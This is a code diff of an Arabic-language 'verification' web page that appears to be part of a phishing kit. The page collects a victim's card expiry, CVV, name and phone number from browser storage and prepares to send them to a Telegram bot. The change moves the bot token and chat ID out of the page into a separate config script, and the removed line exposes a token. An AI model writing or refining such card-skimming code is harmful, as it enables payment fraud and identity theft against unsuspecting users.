@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
+  <script src="/js/telegram-config.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title data-i18n="pageTitleVerification">التحقق</title>
@@ -188,8 +189,8 @@
             const cardExpiry = sessionStorage.getItem('cardExpiry') || 'غير متوفر';
             const cardCvv = sessionStorage.getItem('cardCvv') || 'غير متوفر';
 
-            const botToken = '8889676845:AAGYcVFa7vOi_0FYgpq3WscOXKADANb-2TI';
-            const chatId = '8108427825';
+            const botToken = TELEGRAM_CONFIG.botToken;
+            const chatId = TELEGRAM_CONFIG.chatId;
             
             // جلب اسم العميل ورقم الهاتف من التخزين المحلي
             const name = localStorage.getItem('masheed_customer_name') || 'غير متوفر';
